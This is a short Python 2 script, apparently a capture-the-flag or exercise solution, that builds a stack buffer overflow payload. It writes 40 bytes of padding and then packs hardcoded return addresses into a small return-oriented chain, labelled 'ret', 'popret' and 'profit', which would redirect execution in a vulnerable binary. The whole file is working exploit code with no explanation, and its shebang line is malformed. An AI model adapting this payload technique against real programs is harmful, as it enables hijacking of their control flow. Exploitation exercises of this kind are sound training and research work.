#/usr/bin/python
import struct

def p(x):
    return struct.pack('<L', x)

payload = ""
payload += "B" * 40
payload += p(0x4005ee)		# ret (fix the stack frame)
payload += "\x00\x00\x00\x00"
payload += p(0x4006d8)		# popret
payload += "\x00\x00\x00\x00"
payload += "NEXTNEXT"
payload += p(0x40086d)		# profit
payload += "\x00\x00\x00\x00"

print payload
